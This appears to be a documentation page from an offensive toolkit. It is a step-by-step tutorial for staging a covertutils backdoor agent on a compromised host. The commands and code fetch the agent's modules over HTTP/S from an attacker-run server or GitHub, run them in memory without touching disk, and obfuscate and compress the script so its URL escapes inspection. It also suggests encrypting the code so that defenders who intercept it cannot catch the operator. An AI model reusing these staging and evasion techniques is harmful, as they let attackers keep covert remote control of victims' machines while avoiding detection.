Staging Python code
===================


So, you coded the whole sophisticated backdoor, and it is like 500 Lines-of-Code. With 500 locs it must be a great, super stealth backdoor!

But now what? How do you pack the *Agent* with the whole ``covertutils`` package, to a single Python file?

After some research you could find some solutions. Most of them working.

	- Stickytape_
	-	`The __main__.py Zip archive trick`__
	- ... all kinds of StackOverflow_ questions ...

.. _Stickytape : https://github.com/mwilliamson/stickytape
.. _ziptrick : http://blog.ablepear.com/2012/10/bundling-python-files-into-stand-alone.html
.. _StackOverflow : https://stackoverflow.com/search?q=python+single+script

__  ziptrick_


The problem with them is that they **all require something to be written to disk**.



Step Zero - The httpimport_ module
+++++++++++++++++++++++++++++++++++++

For this purpose I authored the ``httpimport`` module. This module enables a Python script to **remotely import any module or package** through HTTP/S.

It resides in my Github_, where you can find both *documentation* and *usage examples*. It is a single file module, the ``httpimport.py``, which is also *Py2/3 compatible* - just for the hell of it.

.. _Github : https://github.com/operatorequals/httpimport
.. _httpimport : https://github.com/operatorequals/httpimport


Step One - Code *CopyPasta*
+++++++++++++++++++++++++++

Given that the ``unstaged_agent.py`` is the file that contains the awesome 500 loc *Agent* that uses `covertutils`. Execute the following:

.. code :: bash

	curl https://raw.githubusercontent.com/operatorequals/httpimport/master/httpimport.py | sed 's#log.*#pass#g' | grep -v "import pass" > staged_agent.py
	cat unstaged_agent.py >> staged_agent.py

Now the ``staged_agent.py`` consists both of a copy of the ``httpimport`` module and the awesome super cool 500 loc ``covertutils`` *Agent*

.. note ::
	The ``sed`` and ``grep`` magic ensures that all log lines of ``httpimport`` (containing strings) are replaced with ``pass``. This way the script can be further minified.

Step Two - Create a *Python HTTP/S Repo*
++++++++++++++++++++++++++++++++++++++++

Follow instructions in ``httpimport`` README file for that.
Generally it can be summed up to a :

.. code :: bash

	$ python -m SimpleHTTPServer

in the directory where the ``covertutils`` package is available.

.. warning :: **Implications**

	This Server must work from a host which is *HTTP/S accessible to the compromised machine* (the one where the *Agent* will run on).

Note the ``IP`` and ``PORT`` of the ``SimpleHTTPServer``.


Step Three - Wrap ``import`` statements
+++++++++++++++++++++++++++++++++++++++

Assemble the HTTP/S URL of the *Python HTTP/S Repo* like:

.. code ::

	http://server_ip:server_port/

Skim through the code in ``staged_agent.py`` and wrap every ``covertutils`` import block of code with a ``with`` statement as follows :

.. code :: python

	from covertutils.handlers import InterrogatingHandler, FunctionDictHandler
	from covertutils.handlers.impl import StandardShellHandler
	from covertutils.orchestration import StegoOrchestrator
	from covertutils.datamanipulation import asciiToHexTemplate

has to become:

.. code :: python

	with remote_repo(["covertutils"], "http://localhost:8000/") :
		from covertutils.handlers import InterrogatingHandler, FunctionDictHandler
		from covertutils.handlers.impl import StandardShellHandler
		from covertutils.orchestration import StegoOrchestrator
		from covertutils.datamanipulation import asciiToHexTemplate


If you come up with a script for this (entirely possible and funny task) please open a *Github Issue*! Or simply *Pull Request* it - it's already accepted!


.. note ::

	If ``covertutils`` is the only module that you want to *remotely import* you can use Github as the *Python HTTP/S Repo*!
	Just use the ``github_repo`` *context* of ``httpimport`` instead of ``remote_repo``:

	.. code :: python

		with github_repo( 'operatorequals', 'covertutils' ) :
			from covertutils.handlers import InterrogatingHandler, FunctionDictHandler
			from covertutils.handlers.impl import StandardShellHandler
			from covertutils.orchestration import StegoOrchestrator
			from covertutils.datamanipulation import asciiToHexTemplate

	This will ensure that you get the last ``covertutils`` running on the compromised host,
	as well as a not suspicious TLS connection to a **well-known website**! Reputation of Github is too damn high!



Step Three *'n' a half* - Obfuscation
+++++++++++++++++++++++++++++++++++++

Pyminify_ the ``staged_agent.py``. You have a *URL* in there. At least make it difficult to see with ``strings``!


You can try:

.. code :: bash

	pyminifier --obfuscate-builtins --obfuscate-classes --obfuscate-variables staged_agent.py > staged_agent.min.py


This step is **really usefull** as it will remove all comments and License strings, making the code *smaller* and *unreadable* (but functional).

It is also useful to use a ``--gzip``/``--bzip2`` argument as well, to mangle all ``strings`` and minify *even more*!

Check the ``wc`` output (byte size in third column) of the ``gzip`` against ``plain`` outputs:

.. code :: bash

	$ pyminifier  --obfuscate-builtins --obfuscate-classes --obfuscate-variables staged_agent.py > staged_agent.min.py
	$ wc staged_agent.min.py
	 188  381 4402 staged_agent.min.py
	$
	$ pyminifier --gzip --obfuscate-builtins --obfuscate-classes --obfuscate-variables staged_agent.py > staged_agent.min.gzip.py
	$ wc staged_agent.min.gzip.py
	   4    9 2461 staged_agent.min.gzip.py


.. _Pyminify : http://liftoff.github.io/pyminifier/


Step Four - Pack it to an executable *(or not)* / **Use it**
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

The ``staged_agent.min.py`` will remotely load all needed ``covertutils`` modules using an HTTP/S connection to the URL specified.
It doesn't contain any ``covertutils`` code by itself.
No code will be written to disk. **Not even Temporary files**. You can audit the ``httpimport`` module. It contains *no IO system calls*.

So packing to EXE and ELF should work without much hassle, as described in :ref:`native_execs_page`.
Dropping it to a *Python shell* or a *Python command injection* should work as well.



Step FIVE - Improvise
+++++++++++++++++++++

Passing code back and forth with HTTP/S is not really bright - even if it works.
In case the code gets intercepted, it can be inspected (apart from changed). If the *code gets caught*, **we get caught**.

But the code can be **encrypted**!

And encrypted with ciphers found in ``covertutils.crypto.keys``. It can also be signed with scrambling algorithms in ``covertutils.crypto.algorithms``.

And those subpackages can be loaded remotely too. Or minified and used on-the-spot.

The road for a **Staging Protocol** is *Open*. And an HTTP/S proxy which
automatically **obfuscates-encrypts-signs** all requests for Python code wouldn't be so difficult, using only ``covertutils`` as a dependency.
It would also work with ``httpimport`` out-of-the-box!

Wouldn't it be elegant...
